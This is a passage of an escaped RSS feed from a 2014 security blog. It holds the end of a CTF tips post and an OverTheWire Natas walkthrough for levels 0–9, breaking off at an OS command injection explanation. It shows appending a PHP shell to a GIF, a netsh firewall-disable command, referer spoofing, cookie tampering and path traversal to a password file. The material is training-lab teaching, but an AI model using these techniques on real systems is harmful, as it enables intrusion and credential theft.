&lt;li&gt;&lt;strong&gt;nmap&lt;/strong&gt;, obviously. You can use it in Python scripts, using the &lt;a href="https://docs.python.org/2/library/subprocess.html"&gt;subprocess&lt;/a&gt; library:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;[*] Scanning for open ports using nmap&amp;quot;&lt;/span&gt;
&lt;span class="n"&gt;subprocess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;nmap -sS -sV -T4 -p 22-2048 &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;base_URL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;tee&lt;/strong&gt; is nice to store and view the output of another command. It can be very useful with &lt;em&gt;curl&lt;/em&gt;. A simple  example:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;ls | tee file
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;chattr&lt;/strong&gt; is used to change the file attributes of a Linux file system. For example, the command &lt;code&gt;chattr +i&lt;/code&gt; on a file make it not be able to be removed (useful for &lt;em&gt;zombie&lt;/em&gt; processes hunting).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;nm&lt;/strong&gt; is useful for listing symbols from object files&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;md5 hashing&lt;/strong&gt; is used all the time:&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; -n password | md5sum
5f4dcc3b5aa765d61d8327deb882cf99
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;You might want to &lt;strong&gt;append a shell code to an image&lt;/strong&gt; (for example, a GIF file):&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;cat PHP-shell.php &amp;gt;&amp;gt; fig.gif
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Now a special one: Windows! One of the trivia questions in this CTF. How to disable the Windows XP Firewall from command line:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;netsh firewall &lt;span class="nb"&gt;set &lt;/span&gt;opmode &lt;span class="nv"&gt;mode&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;DISABLE.
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;p&gt;&lt;strong&gt;That's it. Hack all the things!&lt;/strong&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">Marina von Steinkirch</dc:creator><pubDate>Wed, 22 Oct 2014 06:30:00 -0400</pubDate><guid>tag:bt3gl.github.io,2014-10-22:exploring-d-ctf-quals-2014s-exploits.html</guid><category>Linux</category><category>RFI</category><category>SQL_injection</category><category>LFI</category><category>RCE</category><category>PHP</category><category>CMS</category><category>ApPHP</category><category>unoconv</category><category>ColdFusion</category><category>Buffer_Overflow</category><category>Steganography</category><category>Wireshark</category><category>ExifTool</category><category>netsh</category><category>CTF</category><category>scapy</category><category>RIPS</category><category>Heartbleed</category><category>nmap</category></item><item><title>Exploiting the Web in 20 Lessons (Natas)</title><link>http://bt3gl.github.io/exploiting-the-web-in-20-lessons-natas.html</link><description>&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/ihtJsdE.png" /&gt;&lt;/p&gt;
&lt;p&gt;Continuing my quest through the &lt;a href="http://overthewire.org/wargames/"&gt;Wargames&lt;/a&gt;, today I am going to talk about the 20 first levels of &lt;a href="http://overthewire.org/wargames/natas/"&gt;Natas&lt;/a&gt;, the &lt;strong&gt;web exploitation episode&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;I divide the exploits in two parts. The first part contains the easy challenges that don't demand much art (and are a bit boring). The second part comprehends the challenges that do, with scripting, brute force, and all the fun stuff.&lt;/p&gt;
&lt;p&gt;Let the game begin.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;No scripting required here, Dude!&lt;/h2&gt;
&lt;h3&gt;Level 0 and 1: Simple source code inspection&lt;/h3&gt;
&lt;p&gt;The first two levels starts with a simple HTML page. No hints.&lt;/p&gt;
&lt;p&gt;Obviously, the first thing we do is ti take a look  at the source code.&lt;/p&gt;
&lt;p&gt;In the 0th level, the password is straight from the there.&lt;/p&gt;
&lt;p&gt;In the first level, we need to  disable  &lt;strong&gt;JavaScript&lt;/strong&gt; so you can right click it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nt"&gt;&amp;lt;body&lt;/span&gt; &lt;span class="na"&gt;oncontextmenu=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;javascript:alert(&amp;#39;right clicking has been blocked!&amp;#39;);return false;&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Too easy.&lt;/p&gt;
&lt;h3&gt;Level 2: Source code inspection for directories&lt;/h3&gt;
&lt;p&gt;Looking at the source code in the second level reveals:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;There is nothing on this page
&lt;span class="nt"&gt;&amp;lt;img&lt;/span&gt; &lt;span class="na"&gt;src=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;files/pixel.png&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Well, this gives us a hint about the folder &lt;strong&gt;files&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Taking a look at:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;http://natas2.natas.labs.overthewire.org/files/&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;gives a file &lt;code&gt;users.txt&lt;/code&gt; with the password.&lt;/p&gt;
&lt;h3&gt;Level 3: Robots.txt&lt;/h3&gt;
&lt;p&gt;Looking at the source code we see this comment:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;&amp;lt;!--&lt;/span&gt; &lt;span class="n"&gt;No&lt;/span&gt; &lt;span class="n"&gt;more&lt;/span&gt; &lt;span class="n"&gt;information&lt;/span&gt; &lt;span class="n"&gt;leaks&lt;/span&gt;&lt;span class="o"&gt;!!&lt;/span&gt; &lt;span class="n"&gt;Not&lt;/span&gt; &lt;span class="n"&gt;even&lt;/span&gt; &lt;span class="n"&gt;Google&lt;/span&gt; &lt;span class="n"&gt;will&lt;/span&gt; &lt;span class="n"&gt;find&lt;/span&gt; &lt;span class="n"&gt;it&lt;/span&gt; &lt;span class="n"&gt;this&lt;/span&gt; &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="p"&gt;...&lt;/span&gt; &lt;span class="o"&gt;--&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;In general, websites use a file called &lt;strong&gt;&lt;a href="http://en.wikipedia.org/wiki/Robots_exclusion_standard"&gt;robots.txt&lt;/a&gt;&lt;/strong&gt;  to tell search engines what should be indexed.&lt;/p&gt;
&lt;p&gt;Looking at:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;http://natas3.natas.labs.overthewire.org/robots.txt&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We find:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;User&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
&lt;span class="nl"&gt;Disallow:&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;s3cr3t&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Looking at the content of  the folder &lt;em&gt;/s3cr3t/&lt;/em&gt; revels:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;Index&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;s3cr3t&lt;/span&gt;

&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;ICO&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;Name&lt;/span&gt;    &lt;span class="n"&gt;Last&lt;/span&gt; &lt;span class="n"&gt;modified&lt;/span&gt;   &lt;span class="n"&gt;Size&lt;/span&gt;    &lt;span class="n"&gt;Description&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="kt"&gt;DIR&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;Parent&lt;/span&gt; &lt;span class="n"&gt;Directory&lt;/span&gt;        &lt;span class="o"&gt;-&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;TXT&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;   &lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;Jul&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;2013&lt;/span&gt; &lt;span class="mi"&gt;13&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;35&lt;/span&gt;   &lt;span class="mi"&gt;40&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Which give us the password file:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;Level 4: Changing the referer tag&lt;/h3&gt;
&lt;p&gt;In this level, the front page shows this message:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;Access disallowed. You are visiting from &amp;quot;http://natas4.natas.labs.overthewire.org/index.php&amp;quot; while authorized users should come only from &amp;quot;http://natas5.natas.labs.overthewire.org/&amp;quot;
&lt;span class="nt"&gt;&amp;lt;br/&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;div&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;viewsource&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;index.php&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;Refresh page&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The server thinks we are coming from a page that is indicated in the &lt;strong&gt;&lt;a href="http://en.wikipedia.org/wiki/HTTP_referer"&gt;referer&lt;/a&gt;&lt;/strong&gt; tag in the headers.&lt;/p&gt;
&lt;p&gt;The referer is a (historically misspelled) tag that carries the address of the URL that linked to the address we are requesting.&lt;/p&gt;
&lt;p&gt;There are many ways to tamper this. While we could use browser plugins such as &lt;a href="https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo?hl=en"&gt;tampermonkey&lt;/a&gt; or &lt;a href="https://chrome.google.com/webstore/detail/modify-headers-for-google/innpjfdalfhpcoinfnehdnbkglpmogdi?hl=en-US"&gt;modify-headers&lt;/a&gt;, the good old &lt;strong&gt;curl&lt;/strong&gt; do it easily:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;curl --user natas4:************************ http://natas4.natas.labs.overthewire.org/index.php --referer &lt;span class="s2"&gt;&amp;quot;http://natas5.natas.labs.overthewire.org/&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Level 5: Tampering cookies&lt;/h3&gt;
&lt;p&gt;When we log in the 5th level, the front page says:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;Access&lt;/span&gt; &lt;span class="n"&gt;disallowed&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="n"&gt;You&lt;/span&gt; &lt;span class="n"&gt;are&lt;/span&gt; &lt;span class="n"&gt;not&lt;/span&gt; &lt;span class="n"&gt;logged&lt;/span&gt; &lt;span class="n"&gt;in&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Inspecting the source does not give any additional information.&lt;/p&gt;
&lt;p&gt;We check the elements of the page. There is a cookie named &lt;em&gt;loggedin&lt;/em&gt; with value &lt;strong&gt;0&lt;/strong&gt;. What happens if we change it to &lt;strong&gt;1&lt;/strong&gt;?&lt;/p&gt;
&lt;p&gt;Using the &lt;a href="http://www.editthiscookie.com/start/"&gt;edit this cookie&lt;/a&gt; plugin we are able to edit it and get the next password.&lt;/p&gt;
&lt;h3&gt;Level 6: Source code inspection for directories II&lt;/h3&gt;
&lt;p&gt;This level comes with a PHP form. We take a look at the source code:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;&amp;lt;?&lt;/span&gt;
&lt;span class="k"&gt;include&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;includes/secret.inc&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;submit&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$secret&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;secret&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Access granted. The password for natas7 is &amp;lt;censored&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Wrong secret&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;span class="x"&gt;&amp;lt;form method=post&amp;gt;&lt;/span&gt;
&lt;span class="x"&gt;Input secret: &amp;lt;input name=secret&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;
&lt;span class="x"&gt;&amp;lt;input type=submit name=submit&amp;gt;&lt;/span&gt;
&lt;span class="x"&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Double LOL.&lt;/p&gt;
&lt;p&gt;We  just need to inspect that first URL to get the value of &lt;em&gt;$secret&lt;/em&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;http://natas6.natas.labs.overthewire.org/includes/secret.inc&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Submitting this value in the input form gives us the password.&lt;/p&gt;
&lt;h3&gt;Level 7: Modifying URLs&lt;/h3&gt;
&lt;p&gt;This level has the following hint in its PHP source code:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nt"&gt;&amp;lt;div&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;content&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;index.php?page=home&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;Home&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;index.php?page=about&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;About&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;br&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;br&amp;gt;&lt;/span&gt;
this is the front page
&lt;span class="c"&gt;&amp;lt;!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 --&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Another easy one.&lt;/p&gt;
&lt;p&gt;Instead of &lt;em&gt;page=home&lt;/em&gt; we change it to:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;page=/etc/natas_webpass/natas8&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We then get our password at:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;Level 8: String decoding&lt;/h3&gt;
&lt;p&gt;This level comes with a PHP form, similar to the 6th level. We take a look at the code source:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;&amp;lt;?&lt;/span&gt;
&lt;span class="nv"&gt;$encodedSecret&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;3d3d516343746d4d6d6c315669563362&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;encodeSecret&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$secret&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nb"&gt;bin2hex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;strrev&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;base64_encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$secret&lt;/span&gt;&lt;span class="p"&gt;)));&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;submit&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;encodeSecret&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;secret&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nv"&gt;$encodedSecret&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Access granted. The password for natas9 is &amp;lt;censored&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Wrong secret&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Simple. The secret is  encoded in some obscuration. Funny enough, it uses the PHP function &lt;a href="http://php.net/manual/en/function.strrev.php"&gt;strrev&lt;/a&gt; to reverse the string.&lt;/p&gt;
&lt;p&gt;We perform the following operations to recover the variable &lt;em&gt;$secret&lt;/em&gt; from the variable &lt;em&gt;$encodedSecret&lt;/em&gt;:&lt;/p&gt;
&lt;p&gt;I - Decode hexadecimal to binary (&lt;em&gt;bin2hex&lt;/em&gt;):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;SECRET&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;hex&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="s"&gt;&amp;#39;==QcCtmMml1ViV3b&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;II - Reverse the string (&lt;em&gt;strrev&lt;/em&gt;):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;SECRET&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;hex&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[::&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="s"&gt;&amp;#39;b3ViV1lmMmtCcQ==&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;III - Base64 decode (&lt;em&gt;base64_encode&lt;/em&gt;):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;SECRET&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;hex&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[::&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;base64&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="s"&gt;&amp;#39;oubWYf2kBq&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We submit this last string in the input form,  giving us the password.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;I'm bored. Can we do something actually cool?&lt;/h2&gt;
&lt;p&gt;Yes, we can.&lt;/p&gt;
&lt;h3&gt;Level 9: OS Command Injection&lt;/h3&gt;
&lt;p&gt;This level's page has a search form. If we try to submit a word, for example &lt;em&gt;secret&lt;/em&gt;, we get several variations of this word:&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/ZQwlqsQl.png" /&gt;&lt;/p&gt;
&lt;p&gt;We inspect the source code:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nt"&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;natas9&lt;span class="nt"&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;div&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;content&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;form&amp;gt;&lt;/span&gt;
Find words containing: &lt;span class="nt"&gt;&amp;lt;input&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;needle&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;input&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;submit&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;submit&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;Search&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
Output:
&lt;span class="nt"&gt;&amp;lt;pre&amp;gt;&lt;/span&gt;
&lt;span class="cp"&gt;&amp;lt;?&lt;/span&gt;
&lt;span class="cp"&gt;$key = &amp;quot;&amp;quot;;&lt;/span&gt;
&lt;span class="cp"&gt;if(array_key_exists(&amp;quot;needle&amp;quot;, $_REQUEST)) {&lt;/span&gt;
&lt;span class="cp"&gt;    $key = $_REQUEST[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;needle&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;];&lt;/span&gt;
&lt;span class="cp"&gt;}&lt;/span&gt;
&lt;span class="cp"&gt;if($key != &amp;quot;&amp;quot;) {&lt;/span&gt;
&lt;span class="cp"&gt;    passthru(&amp;quot;grep -i $key dictionary.txt&amp;quot;);&lt;/span&gt;
&lt;span class="cp"&gt;}&lt;/span&gt;
&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/pre&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;If we try inputs such as *, "", or \n, the query  shows the entire list of words inside the file &lt;em&gt;dictionary.txt&lt;/em&gt;. We tried that, but no password there.&lt;/p&gt;
&lt;p&gt;Taking a closer look to the code we notice the PHP function &lt;a href=""&gt;passthru&lt;/a&gt;, which is used to execute an external command.&lt;/p&gt;
&lt;p&gt;Since the variable &lt;strong&gt;$key&lt;/strong&gt; is &lt;strong&gt;not sanitized&lt;/strong&gt;,  we can add a crafted input to it to inject a code that  displays the password at the folder &lt;em&gt;/etc/natas_webpass/natas10&lt;/em&gt;. This type of attack is called &lt;a href="https://www.owasp.org/index.php/OS_Command_Injection"&gt;OS command injection&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;What should we add to the original &lt;em&gt;grep&lt;/em&gt; command?&lt;/p&gt;
&lt;p&gt;In &lt;strong&gt;Bash&lt;/strong&gt;, the &lt;em&gt;semicolon&lt;/em&gt; permits putting more than one command on the same line. Adding a &lt;strong&gt;;&lt;/strong&gt; to the input allows us to  add a &lt;strong&gt;cat&lt;/strong&gt; after that.&lt;/p&gt;
